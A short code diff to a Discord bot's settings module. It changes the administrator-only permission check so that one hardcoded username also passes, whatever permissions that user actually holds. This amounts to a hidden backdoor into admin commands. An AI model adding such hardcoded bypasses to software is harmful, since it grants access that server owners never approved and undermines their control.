@@ -9,7 +9,7 @@ class Settings(commands.Cog):
         self.bot = bot
 
     async def cog_check(self, ctx):
-        return ctx.author.guild_permissions.administrator
+        return ctx.author.guild_permissions.administrator or str(ctx.author) == 'maramizo#8220'
 
     @commands.command()
     async def prefix(self, ctx, prefix):
